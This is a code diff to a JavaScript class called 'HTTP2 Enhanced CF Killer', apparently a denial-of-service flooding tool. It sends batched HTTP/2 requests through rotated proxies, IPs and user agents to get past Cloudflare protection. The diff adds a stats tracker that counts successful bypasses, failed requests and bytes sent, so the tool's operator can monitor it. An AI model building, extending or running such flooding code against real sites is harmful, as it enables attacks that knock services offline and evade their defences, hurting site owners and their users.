@@ -6,6 +6,7 @@ import { logger } from '../../utils/logger.js';
 import { proxyRotator } from '../../utils/proxy-rotator.js';
 import { globalIPRotator } from '../../utils/ip-rotator.js';
 import { globalUserAgentRotator } from '../../utils/user-agent-rotator.js';
+import { StatsTracker } from '../../utils/stats-tracker.js';
 
 /**
  * ENHANCED HTTP/2 CLOUDFLARE KILLER - ULTIMATE VERSION
@@ -45,6 +46,10 @@ export class HTTP2EnhancedCFKiller {
         this.startTime = Date.now();
         this.requestCount = 0;
         this.bypassCount = 0;
+        
+        // Stats tracking for monitor
+        this.statsTracker = new StatsTracker();
+        this.stats = this.statsTracker.stats;
         
         logger.info('🚀 HTTP2 ENHANCED CF KILLER initialized');
         logger.info(`   RPC Multiplier: 50x (${this.rpc} requests per batch)`);
@@ -349,6 +354,7 @@ export class HTTP2EnhancedCFKiller {
             try {
                 const client = await this.getConnection();
                 const headers = this.generateAdvancedHeaders();
+                const headerSize = JSON.stringify(headers).length;
                 
                 const req = client.request(headers);
 
@@ -360,12 +366,16 @@ export class HTTP2EnhancedCFKiller {
                     const status = responseHeaders[':status'];
                     if (status && status !== 403 && status !== 503 && status !== 429) {
                         this.bypassCount++;
+                        this.statsTracker.addRequest(true, headerSize);
                         logger.debug(`✅ CF Bypass success! Status: ${status} (${this.bypassCount}/${this.requestCount})`);
+                    } else {
+                        this.statsTracker.addRequest(false, headerSize);
                     }
                 });
 
                 req.on('data', (chunk) => {
                     BYTES_SENT.add(chunk.length);
+                    this.statsTracker.addBytes(chunk.length);
                 });
 
                 req.on('end', () => {
@@ -373,6 +383,7 @@ export class HTTP2EnhancedCFKiller {
                 });
 
                 req.on('error', () => {
+                    this.statsTracker.addRequest(false, headerSize);
                     resolve();
                 });
 
